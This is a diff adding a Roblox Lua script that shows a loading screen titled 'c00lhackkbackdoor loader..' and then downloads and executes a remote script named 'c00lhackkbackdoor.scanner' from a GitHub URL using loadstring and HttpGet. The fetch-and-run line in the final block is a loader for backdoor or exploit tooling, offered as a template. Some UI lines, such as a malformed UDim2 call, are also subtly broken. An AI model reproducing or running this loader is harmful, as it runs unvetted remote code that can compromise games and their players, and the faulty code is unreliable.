@@ -1,0 +1,43 @@
+-- Create the loading screen
+local loadingScreen = Instance.new("ScreenGui")
+local frame = Instance.new("Frame")
+local title = Instance.new("TextLabel") -- Title TextLabel
+local text = Instance.new("TextLabel")
+
+-- Set up the ScreenGui
+loadingScreen.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+loadingScreen.Name = "LoadingScreen"
+
+-- Set up the Frame
+frame.Parent = loadingScreen
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+-- Set up the Title TextLabel
+title.Parent = frame
+title.Size = UDim2.new(0.6,3, 0) -- Adjust position for the title
+title.Text = "c00lhackkbackdoor loader.." -- Add your title text here
+title.TextColor3 = Color3.fromRGB(1, 0, 0)
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+title.BackgroundTransparency = 1
+
+-- Set up the Loading TextLabel
+text.Parent = frame
+text.Size = UDim2.new(0.5, 0, 0.1, 0)
+text.Position = UDim2.new(0.25, 0, 0.45, 0)
+text.Text = "Loading..."
+text.TextColor3 = Color3.fromRGB(1, 0, 0)
+text.TextScaled = true
+text.BackgroundTransparency = 1
+
+-- Simulate a loading process
+task.spawn(function()
+    wait(5) -- Simulate a loading time (e.g., 5 seconds)
+    
+    -- Remove the loading screen when done
+    loadingScreen:Destroy()
+    
+    -- Execute another script
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Shadowhacksaw/Hi/refs/heads/main/c00lhackkbackdoor.scanner"))() -- Replace with your script URL
+end)
